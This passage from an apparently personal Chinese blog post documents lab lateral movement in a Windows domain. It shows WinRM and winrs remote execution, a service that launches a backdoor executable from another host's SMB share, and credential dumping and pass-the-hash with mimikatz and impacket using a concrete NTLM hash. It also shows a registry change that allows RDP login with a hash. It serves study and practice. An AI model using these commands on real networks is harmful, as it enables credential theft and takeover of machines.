winrs -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin "cmd"
```

![winrs-pc-get-dc-shell](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/winrs-pc-get-dc-shell.png)

2.winrm

```
shell winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"} -r:192.168.30.10 -u:Administrator -p:uu2fu3o@admin
```

在目标机器上启动一个计算器进程

![winrm-calc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/winrm-calc.png)

也可以通过生成服务的方式

```
#生成名为test的服务
winrm invoke Create wmicimv2/Win32_Service @{Name="test";DisplayName="test";PathName="cmd.exe /k c:\windows\system32\calc.exe"} -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin
```

![test-service](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/test-service.png)

执行以下命令，远程调用该服务

```
winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin
```

![open-tes-service](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/open-tes-service.png)

执行SMB匿名服务器中的后门文件

```
shell winrm invoke Create wmicimv2/Win32_Service @{Name="test2";DisplayName="test2";PathName="cmd.exe /k \\192.168.30.20\smb\Winrm.exe"} -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin
```

![winrm-dc-smb](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/winrm-dc-smb.png)

### 获取交互式会话

+ 利用powershell

powershell基于WinRM规范，Enter-PSSession的Powershell Cmdlet可以启动与远程主机的会话

```
#指定远程系统名
$User = "hack\Administrator"
#指定用户密码
$Password = ConvertTo-SecureString -String "uu2fu3o@admin" -AsPlainText -Force
#整合用户名和密码
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
#根据提供的凭据创建会话
New-PSSession -Name WinRM1 -ComputerName 192.168.30.10 -Credential $Cred -Port 5985
```

执行Get-PSSession来查看已经获取的shell

### Evil-Winrm

项目地址：https://github.com/Hackplayers/evil-winrm

需要ruby环境

## 哈希传递(PTH)攻击

哈希传递是一种针对NTLM协议的攻击技术，在NTLM身份认证的第三步生成Response时，直接使用hash值进行计算，代替使用明文密码.(简单提一嘴，kerberos使用ticket进行验证)

### 为什么要使用pth

+ 目标主机在win server 2012之后，lsass.exe进程中是抓不到明文密码的
+ hash并不好破解

### 简单了解hash

Windows操作系统经常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在ntds.dit中，加密后为散列值。

 Windows操作系统中的密码一般由两部分组成，一部分为LMHash，另一部分为NTLM Hash。在windows中，Hash的结构通常如下

username:RID:LM-HASH:NT-HASH

### PTH的利用

+ 利用mimikatz进行pth

上传mimikatz至跳板机目录下，执行以下命令抓取hash

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
```

![DC-ntlm-hash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/DC-ntlm-hash.png)

利用mimikatz,使用抓取到的NTLM哈希进行PTH攻击

```
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:hack.com /ntlm:c17336b6c2ea715e02e8bbd04c91e543" exit
```

![mimikatz-file-dir](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/mimikatz-file-dir.png)

攻击后会开启一个cmd命令行，能够在该命令行中访问DC主机的CIFS服务

+ 利用impacket进行PTH

impacket提供的几个横向脚本基本都可以使用hash进行传递，例如smbexec.py,psexec.py,wmiexec.py,以smbexec.py为例，执行脚本传递hash获取一个交互式的shell

```python
python smbexec.py -hashes  :c17336b6c2ea715e02e8bbd04c91e543 hack.com/Administrator@192.168.30.10
#python smbexec.py -hashes LM HASH:NTLM HASH <domain>/<username>@<IP>
```

![impacket-PTH](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/impacket-PTH.png)

### 利用PTH登录远程桌面

#### 利用条件

+ 远程主机开启了“受限管理员”模式
+ 用于登陆的用户位于远程主机的管理员组中
+ 拥有目标用户的hash

win server2012 R2以上的版本采用新版RDP，在受限管理员模式下，可以直接使用hash登录远程桌面，不需要提供明文密码

执行以下命令开启受限管理员模式

```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

![open-DisableRestrictedAdmin](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/open-DisableRestrictedAdmin.png)

执行以下命令，查看机器是否开启了受限管理员模式

```
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
```

如果为0则是开启状态，为1则关闭

![look-DisableRA](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/look-DisableRA.png)

当远程主机开启了受限管理员模式，使用mimikatz进行哈希传递攻击

```
privilege::debug sekurlsa::pth /user:Administrator /domain:hack.com /ntlm:c17336b6c2ea715e02e8bbd04c91e543 "/run:mstsc.exe /restrictedadmin"
```

哈希传递成功后执行`/run:mstsc.exe /restrictedadmin`命令，此种情况不需要密码即可登录，需要注意的是用户哈希需要是远程主机

管理组中的用户

然而我搭建的环境中的远程桌面没有该参数，懒得拉环境再测试了，本地机器是有的

## 有关横向的漏洞

内网环境中，可以利用这些漏洞来进行横向，例如永恒之蓝，MS08-67,CVE-2019-0708

![ms17](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/ms17.png)

## 总结一下

横向移动的方法还没有全部实现，像PTT的方法，我打算放到权限持久化或者是票据专题中来练习，所以，这篇文章是基础的，枯燥的，残缺的，下面总结的几个问题也有从往上剽窃来的回答，也有我自己的思考，有错误还希望师傅们指出。

+ 横向移动有哪些手法？

​		CIFS服务(即文件服务的利用),WMI , DCOM/RPC, WinRM , RDP,系统服务,计划任务，Psexec , PTH

+ 横向移动分为哪几个阶段？/ 需要做哪些准备？

​		step1:本机信息收集：内网信息收集：收集当前计算机的网络连接、进程列表、命令执行历史记录、数据库信息、当前用户信息、管理员登录信息、总结密码规律、补丁更新频率等信息；内网情报刺探：刺探内网其他计算机或服务器的 IP、主机名、开放端口、开放服务、开放应用等情报。

​		step2:利用内网计算机或服务器中的不及时修复漏洞、不做安全防护、使用相同口令等弱点来进行横向渗透扩大战果

​		setp3:横向过程中重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作

+ 横向移动核心的部分是什么？

​		在我看来横向移动核心的部分是能否获取到对应远程主机的用户凭据，大部分横向移动的方法都需要用到用户凭据，并且对凭据权限的要求并不低。我认为第二重要的是能否利用CIFS上传文件，在我搭建理论的实验环境中，大部分获取shell的情况都需要远程主机执行SMB匿名共享中的脚本文件，或者是上传脚本文件到远程主机的可执行目录下，用一句话上线的情况并不多。

那么衍生出来的问题

+ 什么样的横向移动不需要获取到用户的凭据

  DCOM，通过RPC调用远程方法直接执行命令，但是该方法也有弊端，例如需要先获取方法，并且双方都需要开启DCOM服务，利用impacket脚本获取shell同样需要凭据

+ 如何绕过监测，实现横向移动?

​		我认为这个算是后话了，目前来看大部分横向移动留下的痕迹并不少,例如在PsExec的使用中会生成大量的日志文件(虽然我在实验中并没有检测到异常日志，但真实环境中会对工具特征进行监测)，痕迹多并不意味着这个工具就不好用，PsExec基于SMB服务，我不认为在正常内网环境中，会主动去关闭该项服务。我认为理解什么方法利用什么服务，利用哪些协议，明白web对抗点才是绕过的关键

## 参考链接

https://tttang.com/archive/1890/#toc_wmi

https://www.freebuf.com/articles/system/229200.html

https://ciphersaw.me/2019/09/22/summary-of-practical-tripple-guide-of-attack-and-defense-by-qianxin/

https://xz.aliyun.com/t/9691

《内网渗透体系建设》一书

各种工具的项目地址已在文中，就不复制粘贴一遍了。

